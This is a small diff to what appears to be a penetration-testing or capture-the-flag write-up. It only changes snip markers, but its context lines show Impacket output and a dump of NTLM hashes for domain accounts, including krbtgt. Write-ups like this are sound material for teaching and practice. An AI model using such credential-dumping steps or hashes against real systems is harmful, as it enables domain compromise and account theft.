@@ -116,7 +116,7 @@ Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 [*] Config file parsed
 [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
-...[SNIP]...
+---[SNIP]---
 ```
 
 #### 4. Copy to Local Linux
@@ -165,7 +165,7 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b9
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
-...[SNIP]...
+---[SNIP]---
 [*] Cleaning up...
 ```
 
